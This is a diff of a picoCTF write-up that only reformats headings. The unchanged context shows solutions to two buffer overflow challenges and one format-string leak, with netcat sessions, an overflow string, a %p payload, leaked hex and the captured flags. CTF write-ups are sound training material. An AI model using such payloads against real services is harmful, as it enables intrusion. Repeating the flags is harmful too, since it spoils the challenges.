@@ -8,7 +8,7 @@ picoCTF{ov3rfl0ws_ar3nt_that_bad_9f2364bc}
   of string to get the flag because though the buffer `buf2` is of 16 bytes but the return address is of 4 bytes hence I required atleast 20 bytes of data to make the
   program to jump to `sigsegv_handler` to get the flag. 
 
-**Working-**     
+### **Working-**     
 ```bash
  nc saturn.picoctf.net 51209
 Input: aefasjedfbnwpiusfgnhbasuiogbfiawsuefgbwyuoatefybawsiuefgawuifgebaweuoeyfbawsuifgvbaseufbnawuioyfgbwaOUEBFTGVAWIOUFTGBAWIUEFBAWIFEBWAISEFBWouiebfawoupeftgbawI(Ueghft9wpUHEF8AW7EGFBAWIEUEFGWaurfhbaw97ufhbawiuyerfhbaweiuughfw
@@ -23,7 +23,7 @@ picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_ef312157}
 ### **Thought Process-**     
 > It was sort of similar to the 1st challenge, after going through the program I understood here also I had to buffer overflow.
 
-**Working-**    
+### **Working-**    
 ```bash
  nc mimas.picoctf.net 61152
 Welcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?
@@ -46,7 +46,7 @@ picoCTF{L34k1ng_Fl4g_0ff_St4ck_11a2b52a}
   to find out the flag address so directly used `%x` to get the hexadecmal values and find out the data by converting the hex data to ASCII. After several tries and observations I was able to find out the addrss 
   and the flag.
 
-**Working-**     
+### **Working-**     
 ```bash
 :~$ nc saturn.picoctf.net 58085
 Tell me a story and then I'll tell you one >> %p %p %p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p
@@ -74,7 +74,7 @@ Here's a story -
 ff851200ff8512208049346782578257825782578257825782578257825782578257825782578257825782578257825782578253f78253f253f782578253f783f78253f253f782578253f783f78253f?253f7825?78253f78?3f78253f?253f7825?78253f78?3f78253f?253f7825?78253f78?3f78253f?253f7825?78253f78?3f78253f?253f7825?78253f78?78253f?6f636970?7b465443?6b34334c?5f676e31?67346c46?6666305f?3474535f?315f6b63?62326131?7d613235?fbad2000?29d9a000?0?e99d4990
 ```
 
-**Tool-**      
+### **Tool-**      
 ![Rapid_Tables](/Images/picoCTF_flag_leak.png)
 
 Here I figured out that I had to rearrange the flag as at the end of the flag `{` this should be there but I was shifted this helped to figure out the shifting.
